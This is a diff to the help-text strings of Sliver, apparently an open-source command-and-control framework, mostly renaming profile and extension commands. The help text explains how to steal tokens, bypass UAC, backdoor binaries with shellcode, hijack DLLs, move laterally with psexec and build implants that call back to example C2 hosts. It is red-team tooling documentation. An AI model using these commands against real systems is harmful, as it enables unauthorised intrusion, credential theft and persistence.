@@ -71,7 +71,7 @@ var (
 		consts.MigrateStr:          migrateHelp,
 		consts.SideloadStr:         sideloadHelp,
 		consts.TerminateStr:        terminateHelp,
-		consts.LoadExtensionStr:    loadExtensionHelp,
+		consts.AliasesStr:          loadAliasHelp,
 		consts.PsExecStr:           psExecHelp,
 		consts.BackdoorStr:         backdoorHelp,
 		consts.SpawnDllStr:         spawnDllHelp,
@@ -84,11 +84,13 @@ var (
 		consts.RegistryWriteStr:             regWriteHelp,
 		consts.RegistryReadStr:              regReadHelp,
 		consts.RegistryCreateKeyStr:         regCreateKeyHelp,
-		consts.PivotsListStr:                pivotListHelp,
+		consts.RegistryDeleteKeyStr:         regDeleteKeyHelp,
+		consts.PivotsStr:                    pivotsHelp,
 		consts.WgPortFwdStr:                 wgPortFwdHelp,
 		consts.WgSocksStr:                   wgSocksHelp,
 		consts.SSHStr:                       sshHelp,
 		consts.DLLHijackStr:                 dllHijackHelp,
+		consts.GetPrivsStr:                  getPrivsHelp,
 
 		// Loot
 		consts.LootStr: lootHelp,
@@ -172,7 +174,7 @@ Execution limits can be used to restrict the execution of a Sliver implant to ma
 
 [[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
 Due to the large number of options and C2s this can be a lot of typing. If you'd like to have a reusable a Sliver config
-see 'help new-profile'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
+see 'help profiles new'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
 command.
 `
 	generateStagerHelp = `[[.Bold]]Command:[[.Normal]] generate stager <options>
@@ -200,23 +202,23 @@ When a stager calls back to this URL, a sliver corresponding to the said profile
 
 stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile
 
-To create a profile, use the [[.Bold]]new-profile[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
+To create a profile, use the [[.Bold]]profiles new[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
 
-new-profile --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
+profiles new --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
 `
 
 	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new [--profile-name] <options>
 [[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.
 
 [[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
-Profiles are an easy way to save a sliver configurate and easily generate multiple copies of the binary with the same
-settings, but will still have per-binary certificates/obfuscation/etc. This command is used with generate-profile:
-	new-profile --profile-name mtls-profile  --mtls foo.example.com --canary 1.foobar.com
-	generate-profile mtls-profile
+Profiles are an easy way to save an implant configuration and easily generate multiple copies of the binary with the same
+settings. Generated implants will still have per-binary certificates/obfuscation/etc. This command is used with "profiles generate":
+	profiles new --mtls foo.example.com --canary 1.foobar.com my-profile-name
+	profiles generate my-profile-name
 `
 
-	generateProfileHelp = `[[.Bold]]Command:[[.Normal]] generate-profile [name] <options>
-[[.Bold]]About:[[.Normal]] Generate a Sliver from a saved profile (see new-profile).`
+	generateProfileHelp = `[[.Bold]]Command:[[.Normal]] generate [name] <options>
+[[.Bold]]About:[[.Normal]] Generate an implant from a saved profile (see 'profiles new --help').`
 
 	msfHelp = `[[.Bold]]Command:[[.Normal]] msf [--lhost] <options>
 [[.Bold]]About:[[.Normal]] Execute a metasploit payload in the current process.`
@@ -227,12 +229,12 @@ settings, but will still have per-binary certificates/obfuscation/etc. This comm
 	psHelp = `[[.Bold]]Command:[[.Normal]] ps <options>
 [[.Bold]]About:[[.Normal]] List processes on remote system.`
 
-	pingHelp = `[[.Bold]]Command:[[.Normal]] ping <sliver name/session>
-[[.Bold]]About:[[.Normal]] Ping Sliver by name or the active sliver. This does NOT send an ICMP packet, it just sends an empty 
-c2 message round trip to ensure the remote Sliver is still responding to commands.`
+	pingHelp = `[[.Bold]]Command:[[.Normal]] ping <implant name/session>
+[[.Bold]]About:[[.Normal]] Ping session by name or the active session. This does NOT send an ICMP packet, it just sends a small 
+C2 message round trip to ensure the remote implant is still responding to commands.`
 
-	killHelp = `[[.Bold]]Command:[[.Normal]] kill <sliver name/session>
-[[.Bold]]About:[[.Normal]] Kill a remote sliver process (does not delete file).`
+	killHelp = `[[.Bold]]Command:[[.Normal]] kill <implant name/session>
+[[.Bold]]About:[[.Normal]] Kill a remote implant process (does not delete file).`
 
 	lsHelp = `[[.Bold]]Command:[[.Normal]] ls <remote path>
 [[.Bold]]About:[[.Normal]] List remote files in current directory, or path if provided.
@@ -262,10 +264,10 @@ On Windows, escaping is disabled. Instead, '\\' is treated as path separator.
 `
 
 	cdHelp = `[[.Bold]]Command:[[.Normal]] cd [remote path]
-[[.Bold]]About:[[.Normal]] Change working directory of the active Sliver.`
+[[.Bold]]About:[[.Normal]] Change working directory of the active session.`
 
 	pwdHelp = `[[.Bold]]Command:[[.Normal]] pwd
-[[.Bold]]About:[[.Normal]] Print working directory of the active Sliver.`
+[[.Bold]]About:[[.Normal]] Print working directory of the active session.`
 
 	mkdirHelp = `[[.Bold]]Command:[[.Normal]] mkdir [remote path]
 [[.Bold]]About:[[.Normal]] Create a remote directory.`
@@ -289,20 +291,20 @@ On Windows, escaping is disabled. Instead, '\\' is treated as path separator.
 [[.Bold]]About:[[.Normal]] (Windows Only) Run a new process in the context of the designated user`
 
 	impersonateHelp = `[[.Bold]]Command:[[.Normal]] impersonate USERNAME
-[[.Bold]]About:[[.Normal]] (Windows Only) Steal the token of a logged in user. Sliver commands that runs new processes (like [[.Bold]]shell[[.Normal]] or [[.Bold]]execute-command[[.Normal]]) will impersonate this user.`
+[[.Bold]]About:[[.Normal]] (Windows Only) Steal the token of a logged in user. Sliver commands that run new processes (like [[.Bold]]shell[[.Normal]] or [[.Bold]]execute-command[[.Normal]]) will impersonate this user.`
 
 	revToSelfHelp = `[[.Bold]]Command:[[.Normal]] rev2self
 [[.Bold]]About:[[.Normal]] (Windows Only) Call RevertToSelf, lose the stolen token.`
 
 	elevateHelp = `[[.Bold]]Command:[[.Normal]] elevate
-[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new sliver session as an elevated process (UAC bypass)`
+[[.Bold]]About:[[.Normal]] (Windows Only) Spawn a new Sliver session as an elevated process (UAC bypass)`
 
 	executeAssemblyHelp = `[[.Bold]]Command:[[.Normal]] execute-assembly [local path to assembly] [arguments]
 [[.Bold]]About:[[.Normal]] (Windows Only) Executes the .NET assembly in a child process.
 `
 
 	executeShellcodeHelp = `[[.Bold]]Command:[[.Normal]] execute-shellcode [local path to raw shellcode]
-[[.Bold]]About:[[.Normal]] Executes the given shellcode in the Sliver process.
+[[.Bold]]About:[[.Normal]] Executes the given shellcode in the implant's process.
 
 [[.Bold]][[.Underline]]++ Shellcode ++[[.Normal]]
 Shellcode files should be binary encoded, you can generate Sliver shellcode files with the generate command:
@@ -369,21 +371,21 @@ Parameters to the Linux and MacOS shared module are passed using the [[.Bold]]LD
 	screenshotHelp = `[[.Bold]]Command:[[.Normal]] screenshot
 [[.Bold]]About:[[.Normal]] Take a screenshot from the remote implant.
 `
-	loadExtensionHelp = `[[.Bold]]Command:[[.Normal]] load-extension <directory path> 
-[[.Bold]]About:[[.Normal]] Load a Sliver extension to add new commands.
-Extensions are using the [[.Bold]]sideload[[.Normal]] or [[.Bold]]spawndll[[.Normal]] commands under the hood, depending on the use case.
-For Linux and Mac OS, the [[.Bold]]sideload[[.Normal]] command will be used. On Windows, it will depend the extension file is a reflective DLL or not.
-Load an extension:
+	loadAliasHelp = `[[.Bold]]Command:[[.Normal]] load-macro <directory path> 
+[[.Bold]]About:[[.Normal]] Load a Sliver macro to add new commands.
+Macros are using the [[.Bold]]sideload[[.Normal]] or [[.Bold]]spawndll[[.Normal]] commands under the hood, depending on the use case.
+For Linux and Mac OS, the [[.Bold]]sideload[[.Normal]] command will be used. On Windows, it will depend the macro file is a reflective DLL or not.
+Load an macro:
 	load /tmp/chrome-dump
-Sliver extensions have the following structure (example for the [[.Bold]]chrome-dump[[.Normal]] extension):
+Sliver macros have the following structure (example for the [[.Bold]]chrome-dump[[.Normal]] macro):
 chrome-dump
 ├── chrome-dump.dll
 ├── chrome-dump.so
 └── manifest.json
 It is a directory containing any number of files, with a mandatory [[.Bold]]manifest.json[[.Normal]], that has the following structure:
 {
-  "extensionName":"chrome-dump", // name of the extension, can be anything
-  "extensionCommands":[
+  "macroName":"chrome-dump", // name of the macro, can be anything
+  "macroCommands":[
     {
       "name":"chrome-dump", // name of the command available in the sliver client (no space)
       "entrypoint":"ChromeDump", // entrypoint of the shared library to execute
@@ -395,7 +397,7 @@ It is a directory containing any number of files, with a mandatory [[.Bold]]mani
 		  "os":"windows", // Target OS for the following files. Values can be "windows", "linux" or "darwin"
           "files":{
             "x64":"chrome-dump.dll",
-            "x86":"chrome-dump.x86.dll" // only x86 and x64 arch are supported, path is relative to the extension directory
+            "x86":"chrome-dump.x86.dll" // only x86 and x64 arch are supported, path is relative to the macro directory
           }
         },
         {
@@ -427,9 +429,9 @@ Each command will have the [[.Bold]]--process[[.Normal]] flag defined, which all
 This command uploads a Sliver binary generated on the fly from a profile.
 The profile must be created with the [[.Bold]]service[[.Normal]] format, so that the service manager can properly start and stop the binary.
 
-To create such a profile, use the [[.Bold]]new-profile[[.Normal]] command:
+To create such a profile, use the [[.Bold]]profiles new[[.Normal]] command:
 
-new-profile --format service --skip-symbols --mtls a.bc.de --profile-name win-svc64
+profiles new --format service --skip-symbols --mtls a.bc.de --profile-name win-svc64
 
 Once the profile has been created, run the [[.Bold]]psexec[[.Normal]] command:
 
@@ -441,7 +443,7 @@ The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows u
 [[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
 [[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"
 
-[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: new-profile --format shellcode --profile-name whatever --http ab.cd
+[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: profiles new --format shellcode --profile-name whatever --http ab.cd
 `
 	makeTokenHelp = `[[.Bold]]Command:[[.Normal]] make-token -u USERNAME -d DOMAIN -p PASSWORD
 [[.Bold]]About:[[.Normal]] Creates a new Logon Session from the specified credentials and impersonate the resulting token.
@@ -481,21 +483,24 @@ When using the binary type, you must either:
 [[.Bold]]Example:[[.Normal]] registry create --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
 	`
 
-	pivotListHelp = `[[.Bold]]Command:[[.Normal]] pivots-list [--id SESSIONID]
-[[.Bold]]About:[[.Normal]] List created pivots
+	regDeleteKeyHelp = `[[.Bold]]Command:[[.Normal]] registry delete PATH [name]
+[[.Bold]]About:[[.Normal]] Remove a value from the windows registry
+[[.Bold]]Example:[[.Normal]] registry delete --hive HKLM "software\\google\\chrome\\BLBeacon\\version"
+	`
+
+	pivotsHelp = `[[.Bold]]Command:[[.Normal]] pivots
+[[.Bold]]About:[[.Normal]] List pivots for the current session. NOTE: pivots are only supported on sessions, not beacons.
 [[.Bold]]Examples:[[.Normal]]
-List pivots for all sessions:
-	
-	pivots-list
-
-List pivots for a specific session:
-
-	pivots-list --id 1
 
 List pivots for the current session:
 
-	pivots-list
-	`
+	pivots
+
+Start a tcp pivot on the current session:
+
+	pivots tcp --bind 0.0.0.0
+
+`
 	wgSocksHelp = `[[.Bold]]Command:[[.Normal]] wg-socks
 [[.Bold]]About:[[.Normal]] Create a socks5 listener on the implant Wireguard tun interface
 [[.Bold]]Examples:[[.Normal]]
@@ -582,7 +587,10 @@ loot fetch
 `
 
 	reactionHelp = fmt.Sprintf(`[[.Bold]]Command:[[.Normal]] reaction
-[[.Bold]]About:[[.Normal]] Automate commands in reaction to event(s).
+[[.Bold]]About:[[.Normal]] Automate commands in reaction to event(s). The built-in
+reactions do not support variables or logic, they simply allow you to run verbatim
+commands when an event occurs. To implement complex event-based logic we recommend
+using SliverPy (Python) or sliver-script (TypeScript/JavaScript).
 
 [[.Bold]]Reactable Events:[[.Normal]]
 % 20s  Triggered when a new session is opened to a target
@@ -603,7 +611,11 @@ loot fetch
 	)
 
 	reactionSetHelp = fmt.Sprintf(`[[.Bold]]Command:[[.Normal]] reaction set
-[[.Bold]]About:[[.Normal]] Set automated commands in reaction to event(s).
+[[.Bold]]About:[[.Normal]] Set automated commands in reaction to event(s).  
+
+The built-in reactions do not support variables or logic, they simply allow you to 
+run verbatim commands when an event occurs. To implement complex event-based logic 
+we recommend using SliverPy (Python) or sliver-script (TypeScript/JavaScript).
 
 [[.Bold]]Examples:[[.Normal]]
 # The command uses interactive menus to build a reaction. Simply run:
@@ -645,8 +657,8 @@ supplied with the --profile flag.
 # Use a local DLL for a hijack
 dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --file /tmp/blah.dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll
 
-# Use a Sliver generated DLL for the hijack
-new-profile --format shared --mtls 1.2.3.4:1234 --profile-name dll
+# Use a Sliver generated DLL for the hijack (you must specify -R or --run-at-load)
+profiles new --format shared --mtls 1.2.3.4:1234 --profile-name dll --run-at-load
 dllhijack --reference-path c:\\windows\\system32\\msasn1.dll --profile dll c:\\users\\bob\\appdata\\slack\\app-4.18.0\\msasn1.dll
 
 # Use a local DLL as the reference DLL
